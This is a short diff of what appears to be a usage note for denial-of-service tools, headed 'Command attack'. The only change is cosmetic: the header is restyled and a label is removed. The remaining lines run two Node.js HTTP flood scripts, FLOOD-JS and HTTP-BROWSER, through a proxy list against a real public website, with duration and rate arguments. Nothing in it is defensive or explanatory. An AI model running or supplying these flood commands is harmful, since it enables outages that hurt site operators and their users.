@@ -1,7 +1,7 @@
-Command attack :
+𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐀𝐭𝐭𝐚𝐜𝐤 :
 
 
-FLOOD-JS : node FLOOD-JS.js https://sex.com proxy.txt 180 GET
+node FLOOD-JS.js https://sex.com proxy.txt 180 GET
 
 
 node HTTP-BROWSER.js https://sex.com 1000 180
